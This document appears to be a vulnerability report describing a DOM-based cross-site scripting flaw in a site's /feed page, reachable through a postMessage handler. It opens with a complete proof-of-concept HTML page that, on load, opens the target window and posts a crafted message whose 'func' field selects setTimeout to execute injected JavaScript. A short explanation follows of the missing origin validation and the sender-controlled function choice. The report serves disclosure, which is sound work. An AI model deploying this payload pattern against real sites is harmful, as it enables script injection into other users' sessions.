# DOM-Based Cross-Site Scripting via Insecure postMessage Handler

payload :

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Pixelboard XSS Test</title>
</head>
<body>
    <h2>Opening Pixelboard...</h2>
    <p id="status">Starting test...</p>
    <button id="retry" style="display:none">Open site</button>

    <script>
        const TARGET_URL = "https://e73a63c61b.0o8.ir/feed";
        const TARGET_ORIGIN = "https://e73a63c61b.0o8.ir";

        function startTest() {
            const target = window.open(
                TARGET_URL,
                "pixelboard_target",
                "width=900,height=700"
            );

            if (!target) {
                document.getElementById("status").textContent =
                    "Popup blocked. Click Open site.";
                document.getElementById("retry").style.display = "block";
                return;
            }

            document.getElementById("status").textContent =
                "Site opened. Sending payload...";

            const payload = ["alert('spara')"];
            payload.action = "log";
            payload.func = "setTimeout";

            setTimeout(() => {
                target.postMessage(payload, TARGET_ORIGIN);

                document.getElementById("status").textContent =
                    "Payload sent!";
            }, 3000);
        }

        document.getElementById("retry").addEventListener("click", startTest);

        window.addEventListener("load", startTest);
    </script>
</body>
</html>
```

## Description

The application implements cross-window communication using the `window.postMessage()` API.

The `/feed` page contains a message listener that processes incoming messages based on their `action` and `func` properties.

During testing, it was identified that the message handler does not properly validate the sender's origin before processing incoming messages. Furthermore, the application allows the message sender to influence the function selected for execution through the `func` property.

## Technical Details

The application processes messages using the `message` event.

The vulnerable behavior involves:

- Accepting messages without sufficient sender-origin validation.

- Trusting the `action` property supplied by the sender.

- Allowing the sender to select a function through the `func` property.

- Passing attacker-controlled data to a potentially dangerous JavaScript execution function.
